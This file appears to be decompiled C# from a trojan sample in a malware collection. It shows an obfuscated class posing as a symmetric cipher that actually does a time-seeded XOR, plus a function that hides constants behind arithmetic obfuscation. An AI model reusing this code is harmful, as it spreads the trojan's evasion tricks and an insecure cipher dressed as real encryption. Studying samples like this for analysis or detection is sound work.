// Decompiled with JetBrains decompiler
// Type: 
// Assembly: ENQ65774100030, Version=3.0.0.207, Culture=neutral, PublicKeyToken=null
// MVID: AAEAE42A-E43E-0EA5-7789-E86022A6FEE5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-20f2e7c67e7ef73a22db3d3c7b1cdb6a3dbef6130c8c0eb7fcbd9e298f7af4c8.exe

using System;
using System.Security.Cryptography;

internal sealed class \uE009 : SymmetricAlgorithm, ICryptoTransform, IDisposable
{
  private Random \uE002;

  public \uE009()
  {
    this.\uE002 = new Random(DateTime.Now.Millisecond);
    this.LegalKeySizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.KeySize = 128;
    this.LegalBlockSizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.BlockSize = 128;
  }

  public override ICryptoTransform CreateEncryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override ICryptoTransform CreateDecryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override void GenerateIV()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.IV = buffer;
  }

  public override void GenerateKey()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.Key = buffer;
  }

  public int TransformBlock(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int length1 = this.Key.Length;
    int length2 = this.IV.Length;
    for (int index = 0; index < _param3; ++index)
    {
      int num = (int) this.IV[index % length2];
      _param4[index + _param5] = (byte) ((uint) _param1[index + _param2] ^ (uint) this.Key[num % length1]);
    }
    return _param3;
  }

  public byte[] TransformFinalBlock(byte[] _param1, int _param2, int _param3)
  {
    byte[] numArray = new byte[_param3];
    this.TransformBlock(_param1, _param2, _param3, numArray, 0);
    return numArray;
  }

  public bool CanReuseTransform => true;

  public bool CanTransformMultipleBlocks => true;

  public int InputBlockSize => 16;

  public int OutputBlockSize => 16;

  internal static int \uE004(int _param0)
  {
    switch (_param0 - (59328812 - 8261962 ^ 51066878))
    {
      case 0:
        return -160 >> 5;
      case 1:
        return 782520324 - 3015373 - 370378620 - 409126335;
      case 2:
        return -~-(976 >> 4);
      case 4:
        return -(1024 >> 7);
      case 5:
        return --524166710 - 524166772;
      case 6:
        return ~304222935 - -304222885;
      case 7:
        return -~-64;
      case 8:
        return (467356303 - 630643466 ^ -163288891) >> 5;
      case 9:
        return -573412284 - -573412281 << 1;
      case 10:
        return -((--815576625 - 394199389 ^ -421377228) >> 5);
      case 11:
        return ~-1086606441 - 578108830 - 508497662;
      case 12:
        return 69022675 - 69022682;
      default:
        return ~(136100652 - -431133028) - -567233677 >> 2;
    }
  }
}
